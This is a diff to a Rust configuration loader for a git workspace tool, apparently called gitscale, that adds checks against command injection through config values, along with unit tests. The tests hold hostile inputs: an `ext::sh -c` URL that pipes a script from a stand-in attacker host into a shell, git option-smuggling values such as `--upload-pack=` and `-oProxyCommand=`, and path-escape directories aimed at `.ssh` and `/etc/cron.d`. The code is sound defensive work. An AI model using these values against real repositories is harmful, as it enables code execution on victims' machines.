@@ -2,7 +2,7 @@ use anyhow::{bail, Context, Result};
 use serde::Deserialize;
 use std::collections::BTreeMap;
 use std::fmt;
-use std::path::{Path, PathBuf};
+use std::path::{Component, Path, PathBuf};
 
 pub const CONFIG_FILENAME: &str = ".gitscale.toml";
 
@@ -162,12 +162,92 @@ pub fn load_config_optional(config_path: &Path) -> Option<GitScaleConfig> {
     load_config(config_path).ok()
 }
 
+// ---------------------------------------------------------------------------
+// Validation
+//
+// `.gitscale.toml` travels inside the repository, so every value below arrives
+// from whoever wrote the checked-out branch. These checks exist because git
+// treats some strings as instructions rather than data — see also the hook
+// allowlist in `crate::trust`, which covers the `[hooks]` table.
+// ---------------------------------------------------------------------------
+
+/// The remote-helper prefix of a URL, if it has one.
+///
+/// `ext::sh -c 'payload'` runs the rest of the string as a command, so a bare
+/// repo URL is enough for code execution — no hooks needed. Helper names are
+/// bare words, so anything containing a path separator is a URL that merely
+/// happens to hold a `::` (an IPv6 literal, say) and is left alone.
+fn remote_helper_prefix(url: &str) -> Option<&str> {
+    let scheme = &url[..url.find("::")?];
+    let bare_word = !scheme.is_empty()
+        && scheme
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'));
+    bare_word.then_some(scheme)
+}
+
+/// Reject a value git would parse as an option rather than as itself. A URL or
+/// revision starting with `-` reaches git as `--upload-pack=…` and similar.
+fn check_not_option_like(value: &str, what: &str, config_path: &Path) -> Result<()> {
+    if value.starts_with('-') {
+        bail!(
+            "{}: {} \"{}\" starts with '-', which git would read as a command-line option",
+            config_path.display(),
+            what,
+            value
+        );
+    }
+    Ok(())
+}
+
+fn check_url(url: &str, what: &str, config_path: &Path) -> Result<()> {
+    check_not_option_like(url, what, config_path)?;
+    if let Some(helper) = remote_helper_prefix(url) {
+        bail!(
+            "{}: {} \"{}\" uses the '{}::' remote helper, which gitscale refuses to run \
+             (a helper such as 'ext::' executes the rest of the URL as a command)",
+            config_path.display(),
+            what,
+            url,
+            helper
+        );
+    }
+    Ok(())
+}
+
+/// A checkout directory must stay inside the workspace: the config decides
+/// where clones land, and `../..` would let it write anywhere the user can.
+fn check_directory(directory: &str, config_path: &Path) -> Result<()> {
+    let path = Path::new(directory);
+    if directory.is_empty() {
+        bail!("{}: a repo directory cannot be empty", config_path.display());
+    }
+    if path.is_absolute() {
+        bail!(
+            "{}: repo directory \"{}\" must be relative to the config, not absolute",
+            config_path.display(),
+            directory
+        );
+    }
+    if path.components().any(|c| c == Component::ParentDir) {
+        bail!(
+            "{}: repo directory \"{}\" escapes the workspace with '..'",
+            config_path.display(),
+            directory
+        );
+    }
+    Ok(())
+}
+
 fn parse_storage(raw: Option<&RawStorage>, config_path: &Path) -> Result<String> {
     let Some(storage) = raw else {
         return Ok(String::new());
     };
     match &storage.url {
-        Some(u) if !u.is_empty() => Ok(u.trim_end_matches('/').to_string()),
+        Some(u) if !u.is_empty() => {
+            check_url(u, "storage.url", config_path)?;
+            Ok(u.trim_end_matches('/').to_string())
+        }
         _ => bail!("{}: storage.url is required", config_path.display()),
     }
 }
@@ -181,6 +261,7 @@ fn parse_repos(
     };
     let mut entries = Vec::new();
     for (directory, spec) in repos {
+        check_directory(directory, config_path)?;
         let url = spec
             .url
             .as_deref()
@@ -193,7 +274,14 @@ fn parse_repos(
                 )
             })?;
 
+        check_url(url, &format!("repos.{}.url", directory), config_path)?;
+
         let revision = spec.revision.clone().unwrap_or_default();
+        check_not_option_like(
+            &revision,
+            &format!("repos.{}.revision", directory),
+            config_path,
+        )?;
 
         let mode = match &spec.mode {
             Some(m) => RepoMode::from_str_checked(m)
@@ -265,4 +353,88 @@ pub fn write_config(config_path: &Path, entries: &[RepoEntry], storage_url: &str
     std::fs::write(config_path, lines.join("\n"))
         .with_context(|| format!("cannot write {}", config_path.display()))?;
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Tests run in parallel in one process, so each config gets its own
+    /// directory rather than sharing a path.
+    fn load(text: &str) -> Result<GitScaleConfig> {
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        static SEQ: AtomicUsize = AtomicUsize::new(0);
+        let dir = std::env::temp_dir().join(format!(
+            "gitscale-cfg-{}-{}",
+            std::process::id(),
+            SEQ.fetch_add(1, Ordering::Relaxed)
+        ));
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join(CONFIG_FILENAME);
+        std::fs::write(&path, text).unwrap();
+        let result = load_config(&path);
+        let _ = std::fs::remove_dir_all(&dir);
+        result
+    }
+
+    #[test]
+    fn ordinary_urls_still_load() {
+        let config = load(
+            r#"
+[storage]
+url = "https://storage.example.com/bucket"
+
+[repos]
+"libs/a" = { url = "git@github.com:thepartly/a.git", revision = "main" }
+"libs/b" = { url = "https://github.com/thepartly/b.git", revision = "v1.2.3" }
+"libs/c" = { url = "/srv/mirrors/c.git", revision = "main" }
+"#,
+        )
+        .expect("a normal config should load");
+        assert_eq!(config.repos.len(), 3);
+    }
+
+    #[test]
+    fn remote_helper_urls_are_refused() {
+        // `ext::` runs the rest of the URL as a command: code execution from a
+        // repo URL alone, with no [hooks] table in sight.
+        let err = load(r#"[repos]
+"libs/a" = { url = "ext::sh -c 'curl https://evil.example/p | sh'", revision = "main" }
+"#)
+        .unwrap_err()
+        .to_string();
+        assert!(err.contains("remote helper"), "{}", err);
+
+        assert!(load("[repos]\n\"a\" = { url = \"fd::7\", revision = \"main\" }\n").is_err());
+    }
+
+    #[test]
+    fn urls_containing_a_double_colon_are_left_alone() {
+        // Only a bare-word prefix is a helper; these are ordinary URLs.
+        assert!(remote_helper_prefix("https://[::1]:8080/a/b.git").is_none());
+        assert!(remote_helper_prefix("https://example.com/a::b.git").is_none());
+        assert!(remote_helper_prefix("ext::sh -c payload") == Some("ext"));
+    }
+
+    #[test]
+    fn option_like_values_are_refused() {
+        // git would read these as flags — `--upload-pack=` is a shell in disguise.
+        assert!(load("[repos]\n\"a\" = { url = \"--upload-pack=payload\" }\n").is_err());
+        assert!(load(
+            "[repos]\n\"a\" = { url = \"https://example.com/a.git\", revision = \"--exec=payload\" }\n"
+        )
+        .is_err());
+        assert!(load("[storage]\nurl = \"-oProxyCommand=payload\"\n").is_err());
+    }
+
+    #[test]
+    fn directories_must_stay_inside_the_workspace() {
+        assert!(load(
+            "[repos]\n\"../../../home/dev/.ssh\" = { url = \"https://example.com/a.git\" }\n"
+        )
+        .is_err());
+        assert!(load("[repos]\n\"/etc/cron.d\" = { url = \"https://example.com/a.git\" }\n").is_err());
+        // A `..` in the middle escapes just as well as one at the front.
+        assert!(load("[repos]\n\"libs/../../x\" = { url = \"https://example.com/a.git\" }\n").is_err());
+    }
 }
